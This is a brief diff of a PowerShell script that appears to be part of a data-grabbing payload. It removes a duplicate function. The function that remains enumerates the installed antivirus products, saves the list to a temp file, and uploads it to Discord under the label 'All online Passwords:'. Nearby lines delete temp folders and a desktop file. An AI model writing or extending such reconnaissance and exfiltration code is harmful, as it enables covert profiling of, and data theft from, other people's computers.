@@ -50,15 +50,6 @@ Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
 function version-av {
   mkdir \temp 
   cd \temp
-  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\resultat.txt -Encoding utf8
-  Upload-Discord -file "C:\Temp\resultat.txt" -text "Anti-spyware version:"
-  cd C:\
-  rmdir -R \temp
-}
-
-function version-av {
-  mkdir \temp 
-  cd \temp
   Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\export.txt -Encoding utf8
   Upload-Discord -file "C:\Temp\export.txt" -text "All online Passwords:"
   cd C:\
